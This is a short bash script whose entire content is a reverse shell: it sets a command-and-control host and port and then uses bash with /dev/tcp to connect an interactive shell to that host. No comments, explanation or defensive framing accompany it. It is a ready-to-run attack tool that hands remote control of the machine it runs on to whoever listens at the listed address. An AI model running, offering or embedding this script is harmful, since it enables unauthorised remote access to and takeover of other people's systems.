#!/bin/bash

C2_HOST="10.0.0.8"
C2_PORT="3333"

bash -i >& /dev/tcp/${C2_HOST}/${C2_PORT} 0>&1
